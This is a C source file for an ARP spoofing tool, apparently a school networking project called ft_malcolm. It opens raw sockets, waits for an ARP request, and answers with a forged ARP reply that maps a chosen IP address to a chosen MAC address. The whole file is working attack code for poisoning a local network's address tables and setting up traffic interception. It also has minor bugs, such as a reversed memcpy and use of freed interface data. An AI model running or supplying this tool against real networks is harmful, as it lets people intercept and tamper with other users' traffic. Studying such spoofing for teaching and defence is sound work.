#include "ft_malcolm.h"

t_gl  g_gl;

static void parseipaddr(struct in_addr* in_addr, char* str)
{
  struct hostent *hostp;

  in_addr->s_addr = inet_addr(str);
  if ((int)in_addr->s_addr == -1)
  {
    if(!(hostp = gethostbyname(str)))
    {
      fprintf(stderr, "ft_malcolm: unknown host [%s].\n", str);
      exit(1);
    }
    ft_memcpy(hostp->h_addr, in_addr, hostp->h_length);
  }
}

static void parsemacaddr(char* buf, char* str)
{
  int i;
  char c;
  char val;

  for (i=0 ; i < ETHMACADDRLEN ; i++)
  {
    if(!(c = ft_tolower(*str++)))
    {
      fprintf(stderr, "%s\n", "ft_malcolm: invalid mac address") ;
      exit(1);
    }
    if(ft_isdigit(c))
      val = c - '0';
    else if (c >= 'a' && c <= 'f')
      val = c - 'a' + 10;
    else
    {
      fprintf(stderr, "%s\n", "ft_malcolm: invalid mac address") ;
      exit(1);
    }
    *buf = val << 4;
    if(!(c = ft_tolower(*str++)))
    {
      fprintf(stderr, "%s\n", "ft_malcolm: invalid mac address") ;
      exit(1);
    }
    if(ft_isdigit(c))
      val = c - '0';
    else if (c >= 'a' && c <= 'f')
      val = c - 'a' + 10;
    else
    {
      fprintf(stderr, "%s\n", "ft_malcolm: invalid mac address") ;
      exit(1);
    }
    *buf++ |= val;
    if (*str == ':')
      str++;
  }
}

static char *getinterface()
{
    struct ifaddrs  *ifap;
    struct ifaddrs  *ifa;

    getifaddrs(&ifap);
    for (ifa = ifap; ifa; ifa = ifa->ifa_next)
    {
      if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET)
      {
        if (ft_strcmp(ifa->ifa_name, "lo"))
        {
            freeifaddrs(ifap);
            return (ifa->ifa_name);
        }
      }
    }
    freeifaddrs(ifap);
    return (NULL);
}


void  craft_arp_pkt(char *const *argv, t_arp *pkt, struct sockaddr *sa, char *ifa)
{
  struct in_addr  src;
  struct in_addr  tgt;

  parsemacaddr((char*)pkt->tgt_hw_addr, argv[4]);
  parsemacaddr((char*)pkt->rcpt_hw_addr, argv[4]);
  parsemacaddr((char*)pkt->src_hw_addr,  argv[2]);
  parsemacaddr((char*)pkt->sndr_hw_addr, argv[2]);
  parseipaddr(&src,  argv[1]);
  parseipaddr(&tgt, argv[3]);
  ft_memcpy(pkt->sndr_ip_addr, &src,  IPADDRLEN);
  ft_memcpy(pkt->rcpt_ip_addr, &tgt, IPADDRLEN);
  ft_bzero(pkt->padding, 18);
  ft_strcpy(sa->sa_data, ifa);
  pkt->frame_type = htons(0x0806);
  pkt->hw_type = htons(ETHER_HW_TYPE);
  pkt->prot_type = htons(0x0800);
  pkt->hw_addr_size = ETHMACADDRLEN;
  pkt->prot_addr_size = IPADDRLEN;
  pkt->op = htons(2);
}

int           timetospoof()
{
  struct ethhdr   *eth;
  t_arph          *arp;

  eth = (struct ethhdr*)g_gl.rcpkt;
  arp = (t_arph*)(g_gl.rcpkt + 14);
  if (htons(eth->h_proto) == 0x0806)
  {  
    if (htons(arp->arp_op) == 0x0001)
    {
            printf("Mac address of request: %02X:%02X:%02X:%02X:%02X:%02X\n",
                arp->arp_sha[0],
                arp->arp_sha[1],
                arp->arp_sha[2],
                arp->arp_sha[3],
                arp->arp_sha[4],
                arp->arp_sha[5]
            );
            printf("IP address of request: %02d:%02d:%02d:%02d\n",
                arp->arp_spa[0],
                arp->arp_spa[1],
                arp->arp_spa[2],
                arp->arp_spa[3]
            );
        return (1);
    }
  }
  return (0);
}

int						unpack()
{
	int					ans;

  ft_bzero(&g_gl.rcpkt, sizeof(g_gl.rcpkt));
	ans = recvfrom(g_gl.rsock, &g_gl.rcpkt, sizeof(g_gl.rcpkt), 0, NULL, NULL);
	return (ans);
}

void   endprog(int sig)
{
  (void)sig;
  printf("Exiting program...\n");
  close(g_gl.sock);
  close(g_gl.rsock);
  exit(0);
}

int   main(int argc, char *const *argv)
{
  t_arp           pkt;
  struct sockaddr sa;
  char            *addr;

  signal(SIGINT, &endprog);
  if ((addr = getinterface()) == NULL)
  {
    fprintf(stderr, "ft_malcolm: %s\n", usage);
    exit(1);
  }
  if (argc != 5)
  {
    fprintf(stderr, "ft_malcolm: %s\n", usage);
    exit(1);
  }
  if ((g_gl.sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP))) < 0)
  {
    fprintf(stderr, "ft_malcolm: %s\n", "Error opening packet socket for arp request");
    exit(1);
  }
  if ((g_gl.rsock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
  {
    fprintf(stderr, "ft_malcolm: %s\n", "Error opening raw socket for arp reply");
    exit(1);
  }
  craft_arp_pkt(argv, &pkt, &sa, addr);
  while (42)
  {
    if (unpack() > 0)
    {
      if (timetospoof())
      {
        if (sendto(g_gl.sock, &pkt, sizeof(pkt), 0, &sa, sizeof(sa)) < 0)
        {
          perror("sendto");
          close(g_gl.sock);
          close(g_gl.rsock);
          exit(1);
        }
        printf("Sent packet, exiting program...\n");
        close(g_gl.sock);
        close(g_gl.rsock);
        exit(0);
      }
    }
  }
  return (0);
}
